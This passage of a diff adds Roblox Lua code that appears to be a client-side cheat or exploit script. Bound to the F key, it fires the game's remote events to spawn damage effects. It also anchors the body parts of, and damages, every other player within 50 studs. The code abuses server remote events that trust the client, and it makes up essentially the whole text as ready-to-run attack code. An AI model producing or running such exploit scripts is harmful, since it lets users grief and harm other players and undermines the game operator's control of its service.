+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*-6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*0, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*0, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*-6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*-6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*0), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    until pro == false
+			end
+		end))
+		wait(0.935)
+		pro = false
+		       game:GetService("ReplicatedStorage").PlayerStrongPunch2:FireServer(Vector3.new(1, -0.3, 1), Vector3.new(1, -0.3, 1), BrickColor.new("Black "))
+    game:GetService("ReplicatedStorage").PlayerStrongPunch2:FireServer(Vector3.new(2, -0.5, 2), Vector3.new(2, -0.5, 2), BrickColor.new("Black"))
+    game:GetService("ReplicatedStorage").PlayerStrongPunch2:FireServer(Vector3.new(3, -0.7, 3), Vector3.new(3, -0.7, 3), BrickColor.new("Black"))
+    game:GetService("ReplicatedStorage").PlayerStrongPunch2:FireServer(Vector3.new(4, -1, 4), Vector3.new(4, -1, 4), BrickColor.new("Black"))
+		game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame , 10, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 30, Color3.new(0 ,0 ,0), "", 1, 1)
+
+		       for i,v in pairs(game.Workspace.Entities:GetChildren()) do
+        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Name ~= game.Players.LocalPlayer.Name then
+            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude < 50 then
+   game:GetService("ReplicatedStorage").Anchor:FireServer(v["Torso"],true)
+game:GetService("ReplicatedStorage").Anchor:FireServer(v["Head"],true)
+game:GetService("ReplicatedStorage").Anchor:FireServer(v["Right Arm"],true)
+game:GetService("ReplicatedStorage").Anchor:FireServer(v["Left Arm"],true)
+game:GetService("ReplicatedStorage").Anchor:FireServer(v["Right Leg"],true)
+game:GetService("ReplicatedStorage").Anchor:FireServer(v["Left Leg"],true)
+game:GetService("ReplicatedStorage").Damage12:FireServer(v.Humanoid, v.Head.CFrame, 0, 0, Vector3.new(0, 0, 0), .5, "", 1, 1)
+    
+            end
+        end
+    end
+end
+  
+    		wait(1.5)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+		                     
+pro = false
+ 
+Mouse.KeyDown:Connect(function(Key)
+    		if Key == "f" then
+    		    Pro()
+end
+end)
